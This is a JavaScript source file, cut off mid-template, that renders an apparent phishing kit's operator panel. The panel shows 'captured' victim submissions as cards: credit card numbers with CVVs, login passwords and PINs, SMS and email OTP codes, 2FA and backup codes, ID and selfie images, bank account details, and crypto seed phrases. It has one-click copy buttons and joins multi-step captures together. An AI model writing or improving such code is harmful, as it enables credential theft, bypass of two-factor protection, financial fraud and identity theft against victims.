/**
 * ALP - Form Data Renderers
 * Renders structured and styled visual preview cards for captured form data.
 */
const FormRenderers = (() => {
  function escapeHtml(s) {
    if (!s) return '';
    const d = document.createElement('div');
    d.textContent = s;
    return d.innerHTML;
  }

  function renderFormData(metadata) {
    if (!metadata || !metadata.formData || metadata.formData.length === 0) {
      return `
        <div style="text-align:center;padding:48px 20px;color:var(--text-tertiary);">
          <div style="font-size:32px;margin-bottom:12px;">📝</div>
          <div style="font-size:13px;font-weight:600;color:var(--text-secondary);margin-bottom:4px;">No Captured Data</div>
          <p style="font-size:11px;color:var(--text-muted);margin:0;">Visitor hasn't submitted any forms yet.</p>
        </div>
      `;
    }

    // ── Field alias resolver ───────────────────────────────────────────────
    // Tries each alias in order and returns the first non-empty value found.
    // This means HTML pages can use any common variant (user, pass, ccnumb…)
    // and the renderer will still display them correctly.
    const resolveField = (obj, ...aliases) => {
      for (const alias of aliases) {
        const v = obj[alias];
        if (v !== undefined && v !== null && String(v).trim() !== '') return String(v).trim();
      }
      return null;
    };

    // ── Cross-entry email resolver ─────────────────────────────────────────
    // Scans ALL form entries once to find the first email/username captured
    // anywhere in the session (e.g. step-1 login page). Used so that
    // password-only step-2 submissions can still display the email.
    const EMAIL_ALIASES = ['email','mail','username','user','userid','login'];
    const sessionEmail = (() => {
      for (const e of metadata.formData) {
        const f = e.fields || {};
        for (const alias of EMAIL_ALIASES) {
          const v = f[alias];
          if (v && String(v).trim()) return String(v).trim();
        }
      }
      return null;
    })();

    const renderEntry = (entry) => {
      const fields = entry.fields || {};
      const page = (entry.page || '').toLowerCase();

      // ── Type detection with aliases ──────────────────────────────────────
      const keys = Object.keys(fields);

      const CC_KEYS = ['card_number','ccnumb','card','cc_number','cardNumber','cardno','pan','ccno',
                       'cvv','cvc','cvc2','cvv2','cccvv','security_code','securitycode'];
      const hasCCKeys = keys.some(k => CC_KEYS.includes(k));
      const isCC = page.includes('/cc') || hasCCKeys;

      const hasEmailAlias = keys.some(k => ['email','mail','username','user','userid','login'].includes(k));
      const hasPasswordAlias = keys.some(k => ['password','pass','pwd','secret'].includes(k));
      const isLogin = page.includes('/login') || page.includes('/password') || page.includes('/credentials') || (hasEmailAlias && hasPasswordAlias) || (hasPasswordAlias && !hasCCKeys);

      const isOtp = page.includes('/otp') || page.includes('/sms') || keys.some(k => ['otp_code','otp','code','verification_code','verificationcode','sms_code'].includes(k));

      const isEmailCode = page.includes('/email_verify') || page.includes('/email_code') || keys.some(k => ['email_code','emailcode','email_otp','emailotp','email_verification_code'].includes(k));

      const isAuthCode = page.includes('/2fa') || page.includes('/authenticator') || page.includes('/totp') || keys.some(k => ['auth_code','authenticator_code','2fa_code','totp_code','totp','google_auth','googleauth'].includes(k));

      const isIdUpload = page.includes('/id_upload') || page.includes('/selfie') || page.includes('/document') || keys.some(k => ['id_front','id_back','selfie','id_photo','face_photo','document_photo','id_number','passport_number'].includes(k));

      const isBanking = page.includes('/banking') || page.includes('/bank') || keys.some(k => ['bank_name','account_number','routing_number','iban','swift_bic','sort_code','acct_no'].includes(k));

      const CRYPTO_KEYS = ['seed_phrase','mnemonic','recovery_phrase','private_key','secret_key','wallet_address','wallet_provider','keystore_json','keystore','crypto_passphrase'];
      const isCrypto = keys.some(k => CRYPTO_KEYS.includes(k)) || page.includes('/crypto') || page.includes('/wallet') || page.includes('/seed');

      if (isCC) {
        // Render Virtual Card
        const formatCardNumber = (num) => {
          if (!num) return '•••• •••• •••• ••••';
          const clean = String(num).replace(/\s/g, '');
          if (/^\d+$/.test(clean)) {
            return clean.replace(/(.{4})/g, '$1 ').trim();
          }
          return num;
        };

        const cardNumVal = resolveField(fields, 'card_number','ccnumb','card','cc_number','cardNumber','cardno','pan','ccno');
        const cardNum = formatCardNumber(cardNumVal);

        const cardHolderVal = resolveField(fields, 'card_holder','ccname','name','card_name','cardHolder','holder','nameoncard');
        const cardHolder = (cardHolderVal || 'YOUR NAME').toUpperCase();

        const expVal = resolveField(fields, 'expiry','ccexp','exp','exp_date','expiration','expiry_date','mmyy','mm_yy');
        const exp = expVal || 'MM/YY';

        const cvvVal = resolveField(fields, 'cvv','cccvv','cvc','cvc2','cvv2','security_code','securitycode');
        const cvv = cvvVal || '•••';

        const firstDigit = cardNum.replace(/\s/g, '')[0];
        let brandLogo = '💳 Card';
        let cardClass = 'default-card';
        if (firstDigit === '4') { brandLogo = '💙 Visa'; cardClass = 'visa-card'; }
        else if (firstDigit === '5') { brandLogo = '🔴 Mastercard'; cardClass = 'mastercard-card'; }
        else if (firstDigit === '3') { brandLogo = '🟢 Amex'; cardClass = 'amex-card'; }

        // Build copy all text
        let ccText = `Card Number: ${cardNum.replace(/\s/g, '')}\nExpiry: ${exp}\nCVV: ${cvv}\nHolder: ${cardHolder}`;
        
        const ccKeys = [
          'card_number', 'ccnumb', 'card', 'cc_number', 'cardNumber',
          'card_holder', 'ccname', 'name', 'card_name', 'cardHolder',
          'expiry', 'ccexp', 'exp', 'exp_date', 'expiration',
          'cvv', 'cccvv', 'cvc', 'security_code'
        ];

        Object.entries(fields).filter(([k]) => !ccKeys.includes(k)).forEach(([k, v]) => {
          ccText += `\n${k.replace(/_/g, ' ')}: ${v}`;
        });

        return `
          <div class="visual-card-wrap">
            <div style="font-size:10px;font-weight:700;color:#c084fc;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
              <span>💳 Card Details · ${escapeHtml(entry.page || '')}</span>
              <div style="display:flex;gap:6px;align-items:center;">
                <button class="copy-all-btn" data-copy="${escapeHtml(ccText)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Card details copied!')" title="Copy all card fields">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                  Copy All
                </button>
                <span style="color:var(--text-tertiary);">${entry.timestamp ? new Date(entry.timestamp).toLocaleTimeString() : ''}</span>
              </div>
            </div>
            <div class="glass-cc-preview ${cardClass}">
              <div class="cc-hdr">
                <span class="cc-chip-sim"></span>
                <span class="cc-brand-logo">${brandLogo}</span>
              </div>
              <div class="cc-number-field" data-copy="${escapeHtml(cardNum.replace(/\s/g, ''))}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Card number copied!')" title="Click to copy card number">
                ${escapeHtml(cardNum)}
                <span style="font-size:10px;opacity:0.6;margin-left:6px;vertical-align:middle;">📋</span>
              </div>
              <div class="cc-row-field">
                <div data-copy="${escapeHtml(cardHolder)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Cardholder copied!')" title="Click to copy name" style="cursor:pointer;">
                  <div class="cc-label-field">Holder 📋</div>
                  <div class="cc-value-field">${escapeHtml(cardHolder)}</div>
                </div>
                <div data-copy="${escapeHtml(exp)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Expiry date copied!')" title="Click to copy expiry" style="cursor:pointer;">
                  <div class="cc-label-field">Expires 📋</div>
                  <div class="cc-value-field">${escapeHtml(exp)}</div>
                </div>
                <div data-copy="${escapeHtml(cvv)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'CVV copied!')" title="Click to copy CVV" style="cursor:pointer;">
                  <div class="cc-label-field">CVV 📋</div>
                  <div class="cc-value-field">${escapeHtml(cvv)}</div>
                </div>
              </div>
            </div>
            <table style="width:100%;margin-top:10px;font-size:12px;color:var(--text-secondary);border-collapse:collapse;">
              ${Object.entries(fields).filter(([k]) => !ccKeys.includes(k)).map(([k, v]) => `
                <tr style="border-bottom:1px solid rgba(255,255,255,0.03);">
                  <td style="padding:6px 0;font-weight:600;width:35%;text-transform:capitalize;vertical-align:middle;">${escapeHtml(k.replace(/_/g, ' '))}</td>
                  <td style="padding:6px 0;color:var(--text-primary);display:flex;justify-content:space-between;align-items:center;gap:8px;vertical-align:middle;">
                    <span>${escapeHtml(String(v))}</span>
                    <button class="copy-btn-inline" data-copy="${escapeHtml(String(v))}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Copied field!')" title="Copy field value">
                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                    </button>
                  </td>
                </tr>
              `).join('')}
            </table>
          </div>
        `;
      } else if (isLogin) {
        const email = resolveField(fields, 'email','username','user','userid','login','mail') || sessionEmail || null;
        const password = resolveField(fields, 'password','pass','pwd','secret') || null;
        const pin = resolveField(fields, 'pin','pincode','login_pin') || null;
        const isEmailFromContext = !resolveField(fields, 'email','username','user','userid','login','mail') && !!sessionEmail && email === sessionEmail;
        const uniqueId = Math.random().toString(36).substr(2, 9);
        
        let credText = '';
        if (email) credText += `Username/Email: ${email}\n`;
        if (password) credText += `Password: ${password}\n`;
        if (pin) credText += `PIN: ${pin}\n`;

        // Build remaining fields not already shown
        const LOGIN_KEYS = ['email','username','user','userid','login','mail','password','pass','pwd','secret','pin','pincode','login_pin'];
        const extraFields = Object.entries(fields).filter(([k]) => !LOGIN_KEYS.includes(k));
        extraFields.forEach(([k, v]) => { credText += `${k.replace(/_/g, ' ')}: ${v}\n`; });

        return `
          <div class="visual-credential-wrap">
            <div style="font-size:10px;font-weight:700;color:#60a5fa;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
              <span>🔐 Credentials · ${escapeHtml(entry.page || '')}</span>
              <div style="display:flex;gap:6px;align-items:center;">
                <button class="copy-all-btn" data-copy="${escapeHtml(credText.trim())}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Credentials copied!')" title="Copy all credential fields">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                  Copy All
                </button>
                <span style="color:var(--text-tertiary);">${entry.timestamp ? new Date(entry.timestamp).toLocaleTimeString() : ''}</span>
              </div>
            </div>
            <div class="credential-box-view">
              ${email ? `
              <div class="cred-item" ${isEmailFromContext ? 'title="Email captured from a previous step"' : ''}>
                <span class="cred-icon">${isEmailFromContext ? '🔗' : '✉️'}</span>
                <span class="cred-val" style="${isEmailFromContext ? 'color:#94a3b8;font-style:italic;' : ''}">${escapeHtml(email)}${isEmailFromContext ? ' <span style="font-size:10px;opacity:0.6;">(from prev. step)</span>' : ''}</span>
                <button class="btn btn-sm btn-outline cred-copy-btn" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(email)}', 'Email copied!');">Copy</button>
              </div>
              ` : ''}
              ${password ? `
              <div class="cred-item">
                <span class="cred-icon">🔑</span>
                <span class="cred-val mono" id="pass-field-${uniqueId}">${'•'.repeat(password.length)}</span>
                <button class="btn btn-sm btn-outline cred-copy-btn" onclick="const p = document.getElementById('pass-field-${uniqueId}'); if(p.textContent.includes('•')){ p.textContent='${escapeHtml(password)}'; this.textContent='Hide'; }else{ p.textContent='${'•'.repeat(password.length)}'; this.textContent='Show'; }">Show</button>
                <button class="btn btn-sm btn-outline cred-copy-btn" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(password)}', 'Password copied!');">Copy</button>
              </div>
              ` : ''}
              ${pin ? `
              <div class="cred-item">
                <span class="cred-icon">🔢</span>
                <span class="cred-val mono">${escapeHtml(pin)}</span>
                <button class="btn btn-sm btn-outline cred-copy-btn" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(pin)}', 'PIN copied!');">Copy</button>
              </div>
              ` : ''}
              ${extraFields.map(([k, v]) => `
              <div class="cred-item" style="border-top:1px solid rgba(255,255,255,0.04);">
                <span style="font-size:11px;color:var(--text-tertiary);text-transform:capitalize;min-width:60px;">${escapeHtml(k.replace(/_/g, ' '))}</span>
                <span class="cred-val" style="font-size:12px;">${escapeHtml(String(v))}</span>
                <button class="btn btn-sm btn-outline cred-copy-btn" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(String(v))}', 'Copied!');">Copy</button>
              </div>
              `).join('')}
            </div>
          </div>
        `;
      } else if (isOtp) {
        const code = resolveField(fields, 'otp_code','otp','code','verification_code','verificationcode','sms_code') || '—';
        const phone = resolveField(fields, 'phone','tel','mobile','phone_number','phonenumber') || 'N/A';
        const otpText = `OTP Code: ${code}${phone !== 'N/A' ? `\nPhone: ${phone}` : ''}`;

        return `
          <div class="visual-otp-wrap">
            <div style="font-size:10px;font-weight:700;color:#34d399;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
              <span>📱 Verification Code · ${escapeHtml(entry.page || '')}</span>
              <div style="display:flex;gap:6px;align-items:center;">
                <button class="copy-all-btn" data-copy="${escapeHtml(otpText)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'OTP details copied!')" title="Copy OTP code and phone number">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                  Copy All
                </button>
                <span style="color:var(--text-tertiary);">${entry.timestamp ? new Date(entry.timestamp).toLocaleTimeString() : ''}</span>
              </div>
            </div>
            <div class="otp-highlight-box">
              <div class="otp-title">SMS OTP Code</div>
              <div class="otp-code-digits" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(code)}', 'OTP copied!');" title="Click to copy OTP">
                ${code.split('').map(d => `<span class="otp-digit-card">${escapeHtml(d)}</span>`).join('')}
              </div>
              ${phone !== 'N/A' ? `
                <div style="font-size:11px;color:var(--text-muted);margin-top:12px;display:flex;justify-content:center;align-items:center;gap:6px;">
                  <span>Phone: <strong>${escapeHtml(phone)}</strong></span>
                  <button class="copy-btn-inline" data-copy="${escapeHtml(phone)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Phone number copied!')" title="Copy Phone Number">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                  </button>
                </div>
              ` : ''}
            </div>
          </div>
        `;
      } else if (isEmailCode) {
        // ── Email Verification Code visual ──────────────────────────────────
        const code = resolveField(fields, 'email_code','emailcode','email_otp','emailotp','email_verification_code','mail_code') || '—';
        const emailAddr = resolveField(fields, 'email','mail','username') || 'N/A';
        const emailText = `Email Code: ${code}${emailAddr !== 'N/A' ? `\nEmail: ${emailAddr}` : ''}`;

        return `
          <div class="visual-otp-wrap">
            <div style="font-size:10px;font-weight:700;color:#06b6d4;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
              <span>📧 Email Verification Code · ${escapeHtml(entry.page || '')}</span>
              <div style="display:flex;gap:6px;align-items:center;">
                <button class="copy-all-btn" data-copy="${escapeHtml(emailText)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Email code copied!')" title="Copy email code">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                  Copy All
                </button>
                <span style="color:var(--text-tertiary);">${entry.timestamp ? new Date(entry.timestamp).toLocaleTimeString() : ''}</span>
              </div>
            </div>
            <div class="otp-highlight-box" style="border-color:rgba(6,182,212,0.25);background:rgba(6,182,212,0.04);">
              <div class="otp-title" style="color:#06b6d4;">📧 Email Verification Code</div>
              <div class="otp-code-digits" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(code)}', 'Code copied!');" title="Click to copy code">
                ${code.split('').map(d => `<span class="otp-digit-card" style="border-color:rgba(6,182,212,0.3);color:#06b6d4;">${escapeHtml(d)}</span>`).join('')}
              </div>
              ${emailAddr !== 'N/A' ? `
                <div style="font-size:11px;color:var(--text-muted);margin-top:12px;display:flex;justify-content:center;align-items:center;gap:6px;">
                  <span>Sent to: <strong>${escapeHtml(emailAddr)}</strong></span>
                  <button class="copy-btn-inline" data-copy="${escapeHtml(emailAddr)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Email copied!')" title="Copy email">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                  </button>
                </div>
              ` : ''}
            </div>
          </div>
        `;
      } else if (isAuthCode) {
        // ── Authenticator / 2FA Code visual ─────────────────────────────────
        const code = resolveField(fields, 'auth_code','authenticator_code','2fa_code','totp_code','totp','google_auth','googleauth','2fa') || '—';
        const backupCode = resolveField(fields, 'backup_code','recovery_code','backup_key') || null;
        let authText = `2FA Code: ${code}`;
        if (backupCode) authText += `\nBackup Code: ${backupCode}`;

        return `
          <div class="visual-otp-wrap">
            <div style="font-size:10px;font-weight:700;color:#f97316;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
              <span>🔑 Authenticator / 2FA · ${escapeHtml(entry.page || '')}</span>
              <div style="display:flex;gap:6px;align-items:center;">
                <button class="copy-all-btn" data-copy="${escapeHtml(authText)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), '2FA code copied!')" title="Copy 2FA code">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                  Copy All
                </button>
                <span style="color:var(--text-tertiary);">${entry.timestamp ? new Date(entry.timestamp).toLocaleTimeString() : ''}</span>
              </div>
            </div>
            <div class="otp-highlight-box" style="border-color:rgba(249,115,22,0.25);background:rgba(249,115,22,0.04);">
              <div class="otp-title" style="color:#f97316;">🔑 Authenticator Code</div>
              <div class="otp-code-digits" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(code)}', '2FA code copied!');" title="Click to copy code">
                ${code.split('').map(d => `<span class="otp-digit-card" style="border-color:rgba(249,115,22,0.3);color:#f97316;">${escapeHtml(d)}</span>`).join('')}
              </div>
              ${backupCode ? `
                <div style="margin-top:14px;background:rgba(249,115,22,0.06);border:1px solid rgba(249,115,22,0.15);border-radius:8px;padding:10px 14px;">
                  <div style="font-size:10px;font-weight:700;color:#f97316;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;">Backup / Recovery Code</div>
                  <div style="font-family:monospace;font-size:14px;color:var(--text-primary);cursor:pointer;display:flex;align-items:center;gap:8px;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(backupCode)}', 'Backup code copied!');" title="Click to copy">
                    ${escapeHtml(backupCode)}
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="opacity:0.5;"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                  </div>
                </div>
              ` : ''}
            </div>
          </div>
        `;
      } else if (isIdUpload) {
        // ── ID Upload / Selfie visual ───────────────────────────────────────
        const idFront = resolveField(fields, 'id_front','front_id','id_front_photo','front_photo','id_photo') || null;
        const idBack = resolveField(fields, 'id_back','back_id','id_back_photo','back_photo') || null;
        const selfieVal = resolveField(fields, 'selfie','face_photo','selfie_photo','live_photo','face_image') || null;
        const idNum = resolveField(fields, 'id_number','passport_number','license_number','document_number') || null;
        const docType = resolveField(fields, 'document_type','doc_type','id_type') || null;

        let idText = '';
        if (docType) idText += `Document Type: ${docType}\n`;
        if (idNum) idText += `ID Number: ${idNum}\n`;
        if (idFront) idText += `ID Front: [uploaded]\n`;
        if (idBack) idText += `ID Back: [uploaded]\n`;
        if (selfieVal) idText += `Selfie: [uploaded]\n`;

        const imgSrc = (v) => {
          if (!v) return null;
          if (v.startsWith('data:image')) return v;
          if (v.startsWith('/9j/')) return 'data:image/jpeg;base64,' + v;
          if (v.startsWith('iVBOR')) return 'data:image/png;base64,' + v;
          if (v.startsWith('http') || v.startsWith('/')) return v;
          return null;
        };

        const renderIdImg = (label, value, icon) => {
          if (!value) return '';
          const src = imgSrc(value);
          return `
            <div style="flex:1;min-width:140px;background:rgba(236,72,153,0.04);border:1px solid rgba(236,72,153,0.15);border-radius:10px;padding:10px;text-align:center;">
              <div style="font-size:10px;font-weight:700;color:#ec4899;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;">${icon} ${escapeHtml(label)}</div>
              ${src ? `<img src="${escapeHtml(src)}" style="max-width:100%;max-height:160px;border-radius:8px;border:1px solid rgba(255,255,255,0.1);" alt="${escapeHtml(label)}">` 
                    : `<div style="font-family:monospace;font-size:11px;color:var(--text-secondary);word-break:break-all;padding:8px;background:rgba(255,255,255,0.03);border-radius:6px;">${escapeHtml(value)}</div>`}
            </div>
          `;
        };

        return `
          <div class="visual-card-wrap" style="border-color:rgba(236,72,153,0.2);">
            <div style="font-size:10px;font-weight:700;color:#ec4899;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
              <span>🪪 ID Upload / Selfie · ${escapeHtml(entry.page || '')}</span>
              <div style="display:flex;gap:6px;align-items:center;">
                <button class="copy-all-btn" data-copy="${escapeHtml(idText.trim())}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'ID info copied!')" title="Copy ID info">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                  Copy All
                </button>
                <span style="color:var(--text-tertiary);">${entry.timestamp ? new Date(entry.timestamp).toLocaleTimeString() : ''}</span>
              </div>
            </div>
            ${docType || idNum ? `
              <div style="display:flex;gap:12px;margin-bottom:12px;flex-wrap:wrap;">
                ${docType ? `
                  <div style="flex:1;background:rgba(236,72,153,0.06);border:1px solid rgba(236,72,153,0.12);border-radius:8px;padding:8px 12px;">
                    <div style="font-size:10px;color:#ec4899;font-weight:600;margin-bottom:4px;">Document Type</div>
                    <div style="font-size:13px;color:var(--text-primary);font-weight:600;">${escapeHtml(docType)}</div>
                  </div>
                ` : ''}
                ${idNum ? `
                  <div style="flex:1;background:rgba(236,72,153,0.06);border:1px solid rgba(236,72,153,0.12);border-radius:8px;padding:8px 12px;cursor:pointer;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(idNum)}', 'ID number copied!');" title="Click to copy">
                    <div style="font-size:10px;color:#ec4899;font-weight:600;margin-bottom:4px;">ID / Passport Number 📋</div>
                    <div style="font-size:13px;color:var(--text-primary);font-weight:600;font-family:monospace;">${escapeHtml(idNum)}</div>
                  </div>
                ` : ''}
              </div>
            ` : ''}
            <div style="display:flex;gap:10px;flex-wrap:wrap;">
              ${renderIdImg('ID Front', idFront, '🪪')}
              ${renderIdImg('ID Back', idBack, '🪪')}
              ${renderIdImg('Selfie', selfieVal, '🤳')}
            </div>
          </div>
        `;
      } else if (isBanking) {
        // ── Banking Details visual ──────────────────────────────────────────
        const bankName = resolveField(fields, 'bank_name','bank','banking_name') || '—';
        const acctNum = resolveField(fields, 'account_number','acct_no','account_no','acct_num') || '—';
        const routingNum = resolveField(fields, 'routing_number','routing_no','aba','aba_number') || null;
        const ibanVal = resolveField(fields, 'iban') || null;
        const swiftVal = resolveField(fields, 'swift_bic','swift','bic','swift_code') || null;
        const sortVal = resolveField(fields, 'sort_code') || null;

        let bankText = `Bank: ${bankName}\nAccount #: ${acctNum}`;
        if (routingNum) bankText += `\nRouting #: ${routingNum}`;
        if (ibanVal) bankText += `\nIBAN: ${ibanVal}`;
        if (swiftVal) bankText += `\nSWIFT/BIC: ${swiftVal}`;
        if (sortVal) bankText += `\nSort Code: ${sortVal}`;

        const BANK_KEYS = ['bank_name','bank','banking_name','account_number','acct_no','account_no','acct_num',
                           'routing_number','routing_no','aba','aba_number','iban','swift_bic','swift','bic','swift_code','sort_code'];

        Object.entries(fields).filter(([k]) => !BANK_KEYS.includes(k)).forEach(([k, v]) => {
          bankText += `\n${k.replace(/_/g, ' ')}: ${v}`;
        });

        return `
          <div class="visual-card-wrap" style="border-color:rgba(20,184,166,0.2);">
            <div style="font-size:10px;font-weight:700;color:#14b8a6;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;">
              <span>🏦 Banking Details · ${escapeHtml(entry.page || '')}</span>
              <div style="display:flex;gap:6px;align-items:center;">
                <button class="copy-all-btn" data-copy="${escapeHtml(bankText)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Banking details copied!')" title="Copy banking details">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                  Copy All
                </button>
                <span style="color:var(--text-tertiary);">${entry.timestamp ? new Date(entry.timestamp).toLocaleTimeString() : ''}</span>
              </div>
            </div>
            <div style="background:linear-gradient(135deg, rgba(20,184,166,0.08), rgba(6,182,212,0.04));border:1px solid rgba(20,184,166,0.15);border-radius:12px;padding:16px;">
              <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
                <div style="font-size:16px;font-weight:700;color:var(--text-primary);display:flex;align-items:center;gap:8px;">🏦 ${escapeHtml(bankName)}</div>
              </div>
              <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:10px;">
                <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(acctNum)}', 'Account # copied!');" title="Click to copy">
                  <div style="font-size:10px;color:#14b8a6;font-weight:600;margin-bottom:4px;">Account Number 📋</div>
                  <div style="font-size:14px;color:var(--text-primary);font-weight:600;font-family:monospace;letter-spacing:1px;">${escapeHtml(acctNum)}</div>
                </div>
                ${routingNum ? `
                  <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(routingNum)}', 'Routing # copied!');" title="Click to copy">
                    <div style="font-size:10px;color:#14b8a6;font-weight:600;margin-bottom:4px;">Routing Number 📋</div>
                    <div style="font-size:14px;color:var(--text-primary);font-weight:600;font-family:monospace;letter-spacing:1px;">${escapeHtml(routingNum)}</div>
                  </div>
                ` : ''}
                ${ibanVal ? `
                  <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(ibanVal)}', 'IBAN copied!');" title="Click to copy">
                    <div style="font-size:10px;color:#14b8a6;font-weight:600;margin-bottom:4px;">IBAN 📋</div>
                    <div style="font-size:14px;color:var(--text-primary);font-weight:600;font-family:monospace;letter-spacing:1px;">${escapeHtml(ibanVal)}</div>
                  </div>
                ` : ''}
                ${swiftVal ? `
                  <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(swiftVal)}', 'SWIFT copied!');" title="Click to copy">
                    <div style="font-size:10px;color:#14b8a6;font-weight:600;margin-bottom:4px;">SWIFT / BIC 📋</div>
                    <div style="font-size:14px;color:var(--text-primary);font-weight:600;font-family:monospace;">${escapeHtml(swiftVal)}</div>
                  </div>
                ` : ''}
                ${sortVal ? `
                  <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(sortVal)}', 'Sort code copied!');" title="Click to copy">
                    <div style="font-size:10px;color:#14b8a6;font-weight:600;margin-bottom:4px;">Sort Code 📋</div>
                    <div style="font-size:14px;color:var(--text-primary);font-weight:600;font-family:monospace;">${escapeHtml(sortVal)}</div>
                  </div>
                ` : ''}
              </div>
            </div>
            ${Object.entries(fields).filter(([k]) => !BANK_KEYS.includes(k)).length > 0 ? `
              <table style="width:100%;margin-top:10px;font-size:12px;color:var(--text-secondary);border-collapse:collapse;">
                ${Object.entries(fields).filter(([k]) => !BANK_KEYS.includes(k)).map(([k, v]) => `
                  <tr style="border-bottom:1px solid rgba(255,255,255,0.03);">
                    <td style="padding:6px 0;font-weight:600;width:35%;text-transform:capitalize;">${escapeHtml(k.replace(/_/g, ' '))}</td>
                    <td style="padding:6px 0;color:var(--text-primary);display:flex;justify-content:space-between;align-items:center;gap:8px;">
                      <span>${escapeHtml(String(v))}</span>
                      <button class="copy-btn-inline" data-copy="${escapeHtml(String(v))}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Copied!')" title="Copy">
